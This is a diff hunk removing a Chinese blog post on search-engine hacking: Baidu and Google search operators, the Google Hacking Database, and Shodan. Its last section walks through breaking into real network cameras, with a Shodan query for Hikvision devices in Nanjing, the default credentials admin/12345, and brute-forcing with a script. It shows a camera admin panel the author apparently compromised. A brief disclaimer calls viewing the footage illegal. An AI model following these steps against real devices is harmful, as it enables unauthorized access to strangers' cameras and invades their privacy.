-            <h2 id="0x00-什么是搜索引擎黑客"><a href="#0x00-什么是搜索引擎黑客" class="headerlink" title="0x00 什么是搜索引擎黑客"></a>0x00 什么是搜索引擎黑客</h2><p>搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。<br>它是通过爬虫机器人不停的在爬世界所有网站，私人的一些重要数据即使没有对外公布，但是极有可能已经被搜索引擎爬到了。这个时候通过搜索引擎的妙用，就可以很轻松的获取你的重要个人信息。  </p>
-<h2 id="0x01-百度谷歌等工具的使用"><a href="#0x01-百度谷歌等工具的使用" class="headerlink" title="0x01 百度谷歌等工具的使用"></a>0x01 百度谷歌等工具的使用</h2><p>首先来讲一下平时经常用到的搜索引擎：</p>
-<ul>
-<li>百度：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></li>
-<li>google: <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></li>
-<li>俄罗斯的yandex：<a href="http://www.yandex.com" target="_blank" rel="noopener">www.yandex.com</a></li>
-</ul>
-<p>平时关键字搜索大家都会就不再赘述，这里主要讲一下百度的一些小技巧：  </p>
-<p>1.加减字符的运用<br>用法： 用“+”包含特定查询词，用“-”排除特定查询词<br>例如：ted +pixiv -演讲<br>我们要搜一个画师的id，不加参数的时候很难找到:  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/hk/1.png" alt=""><br>加了之后就很容易找到相关内容了:  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/hk/2.png" alt=""><br>2.intitle搜索范围限定在网页标题<br>用法： intitle:xxx<br>3.site搜索范围限定在特定站点中<br>用法： site:xxx<br>4.inurl搜索范围限定在url链接中<br>用法： inurl:xxx<br>5.Filetype搜索范围限定在指定文档格式中<br>用法： Filetype:xxx  </p>
-<p>当然，如果一般windows用户不习惯使用这些语法的话，可以选择去<br><a href="https://www.baidu.com/gaoji/advanced.html" target="_blank" rel="noopener">https://www.baidu.com/gaoji/advanced.html</a><br>进行高级搜索  </p>
-<p>google的操作基本一致，这里给一个利用谷歌语法的黑客数据库<br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
-<h2 id="0x02-shodan的基本操作"><a href="#0x02-shodan的基本操作" class="headerlink" title="0x02 shodan的基本操作"></a>0x02 shodan的基本操作</h2><p>这里是shodan的地址<br><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a><br>接下来我们看看什么是shodan<br>在百度百科里面给出了这么一句话：Shodan是互联网上最可怕的搜索引擎。<br>虽然目前人们都认为谷歌是最强劲的搜索引擎，但Shodan才是互联网上最可怕的搜索引擎。与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。<br>我们平时的搜索引擎谷歌百度爬的是网页信息，而shodan爬的是互联网设备和端口。这就造成了什么情况呢？现在智能家电越来越多，有很多会连接到互联网，而shodan就能查找到这些设备，然后不法分子可能就会对这些生活中重要的设备进行入侵，这是十分危险的。</p>
-<h2 id="0x03-入侵网络摄像头"><a href="#0x03-入侵网络摄像头" class="headerlink" title="0x03 入侵网络摄像头"></a>0x03 入侵网络摄像头</h2><p>做了这么多铺垫，我们来体验一下shodan，入侵一下网络上弱口令的摄像头。<br>首先打开shodan，注册个账号，这样才能使用过滤，然后我们在搜索框输入：Hikvision-Webs country:”CN” city:”Nanjing”<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/3.png" alt=""><br>这句话是搜索所有地点为中国南京的海康威视摄像头设备，我们搜索到很多结果，下来我们点击某些设备的index打开它的后台界面，海康威视的默认账号是admin，密码是12345，我们可以写个python脚本批量测试，也可以写个弱口令字典，用python脚本对这些设备进行暴力破解（前面的博客写过一些这类脚本，只需稍作更改）。<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/4.png" alt=""><br>如图是一个已被破解的摄像头管理界面，而且是管理员权限，在这里我们可以查看摄像头拍摄的界面和更改各种设置。<br><img src="http://oo3iot5oz.bkt.clouddn.com/hk/5.png" alt=""><br>点击预览、回放等就可以查看摄像头内容了，但是谨记这会侵犯别人的隐私权，是违法的行为，我们是遵纪守法的好公民所以知道它的原理和危害就足够。运用技术保护好个人隐私，如非必要不将摄像头接入互联网，一定要接入的话，不能使用容易被破解的弱口令。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2398,7 +2432,7 @@ main()
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">82</span>
+                <span class="site-state-item-count">83</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
